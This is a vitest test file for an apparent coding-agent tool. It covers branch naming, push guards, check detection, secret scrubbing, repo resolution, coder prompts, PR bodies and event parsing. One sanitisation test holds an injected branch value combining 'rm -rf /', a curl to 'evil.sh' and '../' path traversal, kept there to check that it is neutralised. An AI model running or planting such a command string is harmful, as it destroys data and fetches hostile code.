import { describe, expect, it } from "vitest";
import { assertPushable, branchName, coderPrompt, detectChecks, pullRequestBody, readCoderEvent, resolveRepo, scrub } from "./code-plan.js";

describe("code runs", () => {
  it("names branches by kind of change and a few key words", () => {
    const run = "3f9a1c2d-0000-4000-8000-000000000000";
    expect(branchName("Add dark mode to the Settings page!", run)).toBe("mates/feat/add-dark-mode-settings-page-3f9a");
    // A long task keeps its first few meaningful words and is cut between words.
    expect(branchName("Update the README to mention the new installation steps and fix the typos in the contributing guide", run)).toBe("mates/docs/update-readme-mention-new-3f9a");
    expect(branchName("Fix the crash when the cart is empty", run)).toBe("mates/fix/crash-when-cart-empty-3f9a");
    expect(branchName("Add tests for the checkout total", run)).toBe("mates/test/add-tests-checkout-total-3f9a");
  });

  it("uses the mate's suggested name, cleaned", () => {
    const run = "abcdef12-0000";
    expect(branchName("Something long the user said", run, "fix/Login redirect after sign-in!")).toBe("mates/fix/login-redirect-after-sign-abcd");
    expect(branchName("Something", run, "docs/README install steps")).toBe("mates/docs/readme-install-steps-abcd");
    // "fix/fix-…" says it twice.
    expect(branchName("Something", run, "fix/fix login")).toBe("mates/fix/login-abcd");
    // An unknown kind is just words; the kind then comes from the task.
    expect(branchName("Fix the header", run, "feature/dark header")).toBe("mates/fix/feature-dark-header-abcd");
    // A kind with no words falls back to the task.
    expect(branchName("Add a pricing page", run, "feat/")).toBe("mates/feat/add-pricing-page-abcd");
  });

  it("keeps branch names short and safe whatever comes in", () => {
    const safe = /^mates\/(feat|fix|docs|refactor|test|chore|perf)\/[a-z0-9]+(-[a-z0-9]+)*-[0-9a-f]{4}$/;
    const injected = branchName("Add search", "abcdef12", "feat/$(rm -rf /); `curl evil.sh` && ../../.git");
    expect(injected).toMatch(safe);
    expect(injected).not.toContain("..");
    expect(branchName("🚀", "abcdef12-0000")).toBe("mates/feat/change-abcd");
    expect(branchName("Please, can you just make it?", "abcdef12")).toBe("mates/feat/change-abcd");
    expect(branchName("Fix the café menu", "abcdef12")).toBe("mates/fix/cafe-menu-abcd");
    const long = branchName("x".repeat(80), "123456");
    expect(long).toBe(`mates/feat/${"x".repeat(28)}-1234`);
    for (const task of ["Rename every component in src/ui to PascalCase and update all the imports across the monorepo", "Upgrade React Native to 0.86 and fix whatever breaks in the build"])
      expect(branchName(task, "abcdef12").split("/").at(-1)!.length).toBeLessThanOrEqual(28 + 5);
  });

  it("never pushes outside its own branches", () => {
    expect(() => assertPushable("main", "main")).toThrow();
    expect(() => assertPushable("feature/x", "main")).toThrow();
    expect(() => assertPushable("mates/x-123456", "main")).not.toThrow();
  });

  it("finds the package manager and the checks a repo defines", () => {
    const pkg = JSON.stringify({ scripts: { typecheck: "tsc", lint: "eslint .", test: "vitest run", dev: "vite" } });
    expect(detectChecks(pkg, ["pnpm-lock.yaml"])).toEqual({
      manager: "pnpm",
      install: "pnpm install --frozen-lockfile",
      checks: [
        { name: "typecheck", command: "pnpm typecheck" },
        { name: "lint", command: "pnpm lint" },
        { name: "test", command: "pnpm test" },
      ],
    });
    const placeholder = JSON.stringify({ scripts: { test: 'echo "Error: no test specified" && exit 1' } });
    expect(detectChecks(placeholder, ["package-lock.json"])).toEqual({ manager: "npm", install: "npm ci", checks: [] });
    expect(detectChecks(null, [])).toBeNull();
    expect(detectChecks("{not json", [])).toBeNull();
  });

  it("scrubs secrets from output and keeps the tail", () => {
    const output = "push https://x-access-token:ghs_abcdefghijklmnopqrstuvwxyz123@github.com/a/b failed with sk-or-v1-0123456789abcdefghijkl and hunter2-secret";
    const clean = scrub(output, ["hunter2-secret"]);
    expect(clean).not.toMatch(/ghs_|sk-or-v1-0123|hunter2/);
    expect(scrub("a".repeat(5_000), [], 100)).toHaveLength(101);
  });

  it("resolves what the user calls a repo", () => {
    const repos = ["Owusu1946/mates", "Owusu1946/finora", "acme/mates", "Owusu1946/ecolens-web"];
    expect(resolveRepo("owusu1946/mates", repos)).toEqual({ repo: "Owusu1946/mates" });
    expect(resolveRepo("https://github.com/Owusu1946/finora.git", repos)).toEqual({ repo: "Owusu1946/finora" });
    expect(resolveRepo("ecolens", repos)).toEqual({ repo: "Owusu1946/ecolens-web" });
    expect(resolveRepo("mates", repos)).toEqual({ candidates: ["Owusu1946/mates", "acme/mates"] });
    expect(resolveRepo("nope", repos)).toEqual({ candidates: [] });
  });

  it("briefs the coder with rules, checks and previous failures", () => {
    const prompt = coderPrompt({
      task: "Add a /health route",
      rules: "Run pnpm test after changes.",
      checks: [{ command: "pnpm test" }],
      failures: [{ name: "test", command: "pnpm test", passed: false, output: "1 failed" }],
    });
    expect(prompt).toContain("Add a /health route");
    expect(prompt).toContain("Run pnpm test after changes.");
    expect(prompt).toContain("`pnpm test`");
    expect(prompt).toContain("1 failed");
    expect(prompt).toContain("grep and glob");
  });

  it("sends only the failures when a fix round continues the session", () => {
    const failures = [{ name: "test", command: "pnpm test", passed: false, output: "1 failed" }];
    const prompt = coderPrompt({ task: "Add a /health route", rules: "Long rules", checks: [{ command: "pnpm test" }], failures, continued: true });
    expect(prompt).toContain("1 failed");
    expect(prompt).not.toContain("Add a /health route");
    expect(prompt).not.toContain("Long rules");
    expect(coderPrompt({ task: "Add a /health route", rules: null, checks: [], continued: true })).toContain("Add a /health route");
  });

  it("writes a PR description with checks and the requester", () => {
    const body = pullRequestBody({ task: "Add a /health route", summary: "Adds GET /health.", checks: [{ name: "test", command: "pnpm test", passed: true, output: "" }], requester: "Kenneth" });
    expect(body).toContain("✅ `pnpm test`");
    expect(body).toContain("on behalf of Kenneth");
  });

  it("turns the coder's events into lines a person can follow", () => {
    const tool = (tool: string, input: Record<string, unknown>, status = "completed") => JSON.stringify({ type: "tool_use", part: { type: "tool", tool, state: { status, input } } });
    expect(readCoderEvent(tool("edit", { filePath: "/work/repo/src/app.ts" }), "/work/repo")).toEqual({ activity: "Editing src/app.ts" });
    expect(readCoderEvent(tool("bash", { command: "pnpm test\necho done" }), "/work/repo")).toEqual({ activity: "Running pnpm test" });
    expect(readCoderEvent(tool("grep", { pattern: "useTheme" }), "/work/repo")).toEqual({ activity: "Searching for useTheme" });
    expect(readCoderEvent(tool("read", { filePath: "/work/repo/README.md" }, "error"), "/work/repo")).toEqual({});
    expect(readCoderEvent(tool("read", { path: "/work/repo/src/index.ts" }), "/work/repo")).toEqual({ activity: "Reading src/index.ts" });
    expect(readCoderEvent(tool("mystery", {}), "/work/repo")).toEqual({ activity: "Using mystery" });
    expect(readCoderEvent(JSON.stringify({ type: "text", part: { type: "text", text: "Added the toggle." } }), "/work/repo")).toEqual({ text: "Added the toggle." });
    expect(readCoderEvent(JSON.stringify({ type: "step_start", part: { type: "step-start" } }), "/work/repo")).toEqual({ activity: "Thinking" });
    expect(readCoderEvent("plain output", "/work/repo")).toEqual({ text: "plain output" });
    expect(readCoderEvent("   ", "/work/repo")).toEqual({});
    expect(readCoderEvent(tool("bash", { command: "x".repeat(200) }), "/work/repo").activity).toHaveLength("Running ".length + 80);
  });

  it("surfaces model retries and errors instead of going quiet", () => {
    const retry = readCoderEvent(JSON.stringify({ type: "retry", attempt: 2, error: { message: "Insufficient credits" } }), "/work/repo");
    expect(retry.retry).toEqual({ attempt: 2, message: "Insufficient credits" });
    expect(retry.activity).toContain("Insufficient credits");
    expect(readCoderEvent(JSON.stringify({ type: "error", error: { type: "unknown", message: "Model not found" } }), "/work/repo").failure).toBe("Model not found");
    expect(readCoderEvent(JSON.stringify({ type: "error" }), "/work/repo").failure).toBe("The coder stopped with an error.");
  });
});
